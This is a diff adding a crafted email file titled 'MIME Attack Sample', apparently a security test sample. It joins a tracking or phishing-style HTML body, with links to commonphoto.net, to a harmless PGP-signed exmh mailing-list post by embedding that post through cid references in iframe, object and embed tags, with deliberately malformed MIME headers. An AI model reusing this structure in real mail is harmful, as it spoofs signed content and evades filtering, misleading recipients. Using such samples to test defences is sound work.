@@ -1,0 +1,107 @@
+From: marcie.milner@enron.com
+To: mday@gmssr.com, rmp@cpuc.ca.gov, rick.counihan@greenmountain.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html; charset="iso-8859-1"
+Status: O
+Content-Length: 1652
+Lines: 33
+
+<html>
+<head>
+<meta HTTP-EQUIV="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Email Message</title>
+</head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<p align="center">Having trouble viewing this email properly, <a
+href="http://commonphoto.net/nfospal?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU"target="_blank">please click here.</a></p>
+
+<center>
+<table cellspacing="0" cellpadding="0" border="0">
+<tr>
+    <td><a href="http://commonphoto.net/nfospal?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU"><img src="http://commonphoto.net/Mck1dl_9ndkspwsl/sf1wr.gif" border="0"></a></td>
+</tr>
+<tr>
+    <td><a href="http://commonphoto.net/nfospal?JHjUb2xEZLEQqBeAPNzU-OKAVKFE9m5Qw6QAZaWFsmfAVUfUGsqR2OrApJLQ57CAgUkR6RcB"><img src="http://commonphoto.net/Mck1dl_9ndkspwsl/bg1sf.gif" border="0"></a></td>
+</tr>
+<tr>
+    <td><a href="http://commonphoto.net/nfospal?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU"><img src="http://commonphoto.net/Mck1dl_9ndkspwsl/rd1fg.gif" border="0"></a></td>
+</tr>
+</table>
+</center>
+
+<ul style="list-style-image:url(http://commonphoto.net/mfsdmab?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU);color:white"><li></ul>
+<LINK href="http://commonphoto.net/mesapsd?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU" type=text/css rel=STYLESHEET>
+<p />
+<p align="center">
+<a href="http://commonphoto.net/smfjhg?KKLVoLlQp.EAHArE7uDBS7IRtl1AtcpAqrQAFYgAh0IAUMCRsN6BluwALhvVddcAbmnU"><img src="http://commonphoto.net/oajxhjdnfl.gif"
+border="0" alt=""></a>
+</p>
+</body>
+</html>
+
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Content-Type: text/plain; charset=us-ascii
+
+After a bit of peeking through the exmh tcl and playing with tcl a bit, I got 
+the "catchup unseen messages before cur" procedure working.  Here's the code 
+for everybody and the list archives in case anyone wants it in the future.  
+Thanks to John R. LoVerso for putting me on the right track.  
+
+proc My_Mark2CurSeen {} {
+    global exmh pick msg
+    set results {}
+    Exmh_Status "Clearing unseen up to cur..." red
+    Mh_SetCur $exmh(folder) $msg(id)
+    set unseen [Mh_Unseen $exmh(folder)]
+    foreach elem $unseen {
+         if { $elem < $msg(id) } {
+            lappend results $elem
+         }
+    }
+    set pick(ids) $results
+    busy PickMarkSeen
+    Exmh_Status ok blue
+}
+
+If you want to use this, stick it in your .tk/exmh directory, run auto_mkindex 
+on it and add the following lines to your .exmh/exmh-defaults:
+*Fops.more.m.uentrylist:        ketchup
+*Fops.more.m.l_ketchup:         Catch-up all before current
+*Fops.more.m.c_ketchup:         My_Mark2CurSeen
+
+- -- 
+Ted Cabeen           http://www.pobox.com/~secabeen            ted@impulse.net 
+Check Website or Keyserver for PGP/GPG Key BA0349D2         secabeen@pobox.com
+"I have taken all knowledge to be my province." -F. Bacon  secabeen@cabeen.org
+"Human kind cannot bear very much reality."-T.S.Eliot        cabeen@netcom.com
+
+
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.7 (FreeBSD)
+Comment: Exmh version 2.5 07/13/2001
+
+iD8DBQE9mJ6XoayJfLoDSdIRAkaQAJ9NL83MUU6bJRB19x7MgRaDQhc3ZwCfRK5d
+PXat04+AnSx4tHjn5p8mZVc=
+=sJtk
+-----END PGP SIGNATURE-----
+
+
+
+__
+--BOUNDARY--
+--DELIMITER--
